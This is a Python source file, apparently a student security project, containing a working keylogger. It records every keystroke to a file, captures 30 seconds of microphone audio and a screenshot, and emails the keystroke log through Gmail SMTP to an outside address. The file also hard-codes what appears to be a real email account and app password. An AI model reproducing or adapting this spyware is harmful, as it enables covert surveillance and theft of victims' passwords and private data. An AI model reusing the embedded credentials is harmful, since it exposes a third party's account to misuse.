# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

from pynput.keyboard import Key, Listener

from scipy.io.wavfile import write
import sounddevice as sd

import getpass

from PIL import ImageGrab

keys_information = "key_log.txt"
screenshot_information = "screenshot.png"
audio_information = "audio.wav"

email_address = "211111230@stu.manit.ac.in"
password = "lxhw qhfr ftss jebc"
toaddr = "bizarresherlockholmes@gmail.com"

microphone_time = 30

username = getpass.getuser()

file_path = "D:\\Harsh\\CyberSec Projects\\Key Logger"
# file_path = "D:\\" + username
extend = "\\"


# get the microphone audio
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)


microphone()


# get screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


screenshot()


def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Cybersecurity Key Log"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment;filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


send_email(keys_information, file_path + extend + keys_information, toaddr)

# keylogger
count = 0
keys = []


def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
